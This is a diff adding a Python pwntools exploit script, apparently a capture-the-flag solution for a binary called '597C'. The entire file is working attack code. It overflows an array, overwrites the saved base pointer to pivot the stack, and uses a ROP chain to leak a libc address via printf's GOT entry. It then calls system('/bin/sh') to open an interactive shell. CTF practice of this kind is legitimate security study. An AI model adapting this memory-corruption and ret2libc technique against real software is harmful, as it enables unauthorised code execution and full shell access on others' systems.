@@ -1,0 +1,122 @@
+from pwn import *
+
+#init
+
+e = ELF('./597C')
+libc = ELF('./libc-2.31.so')
+
+context.binary = e
+
+p = process(e.path)
+
+#funcs
+
+def pr(x):
+    global w
+    w -= 1
+    p.sendline(str(x))
+
+def num(x, y):
+    #generate sequences of length 9 that correspondes to powers of 0x80 to make a base 0x80 number
+    for i in reversed(range(10)):
+        for j in range(i):
+            for l in range(0x80):
+                pr(x + 10 * i + j)
+        for j in range(i, 9):
+            pr(x + 10 * i + j)
+        for j in range((y >> (7 * i)) & 0x7f):
+            pr(x + 10 * i + 9)
+
+#vars
+
+n = 122220
+off1 = 0x1000
+off2 = 0x2001
+off3 = 0x3000
+
+arr = e.sym['a']
+scanf_plt = e.plt['__isoc99_scanf']
+printf_got = e.got['printf']
+printf_off = libc.sym['printf']
+system_off = libc.sym['system']
+
+log.info('Arr adr: ' + hex(arr))
+log.info('Scanf plt adr: ' + hex(scanf_plt))
+log.info('Printf got adr: ' + hex(printf_got))
+log.info('Printf libc off: ' + hex(printf_off))
+log.info('System libc off: ' + hex(system_off))
+
+#exploit
+
+#use large test value that allows overflow
+
+p.sendline(f'{n} 10')
+
+w = n
+
+#overwrite rbp to point backward on stack
+
+num(off3, (1 << 64) + 0x8 * (off2 - n - 7))
+pr(n)
+
+#make rop chain to leak libc, write system adr and '/bin/sh', and pivot stack to call system('/bin/sh')
+
+rop = ROP(e)
+rop.printf(arr + 0x4 * (n - 1), printf_got)
+rop.call(scanf_plt, [arr + 0x4 * (n - 1), arr + 0x1000])
+rop.call(rop.leave.address)
+
+a = [arr + 0x1000 - 0x8] + rop.build()
+
+for i in range(len(a)):
+    if type(a[i]) is bytes:
+        a[i] = u64(a[i].ljust(8, b'\x00'))
+
+#account for bit operations
+
+for i in range(len(a)):
+    x = off2 + i + 1
+    while((x + (x & -x)) <= off2 + len(a)):
+        x += (x & -x)
+        y = x - off2 - 1
+        a[y] -= a[i]
+
+        if(a[y] < 0):
+            a[y] += (1 << 64)
+
+for i in range(len(a) - 1):
+    a[i] -= a[i + 1]
+
+#write rop chain
+
+for i in reversed(range(len(a))):
+    num(off1 + 0x100 * i, a[i])
+    pr(off2 + i)
+
+#finish rest
+
+while w > 1:
+    pr(1)
+
+#add '%s' string for rop chain
+
+pr(u64(b'%s'.ljust(8, b'\x00')))
+
+#get libc
+
+p.recvline()
+libc_off = u64(p.recv(6).ljust(8, b'\x00')) - printf_off
+
+log.info('Libc off adr: ' + hex(libc_off))
+
+#write system('/bin/sh')
+
+libc.address = libc_off
+rop = ROP(libc, arr + 0x1000)
+rop.system('/bin/sh')
+
+p.sendline(rop.chain())
+
+#pray for flag
+
+p.interactive()
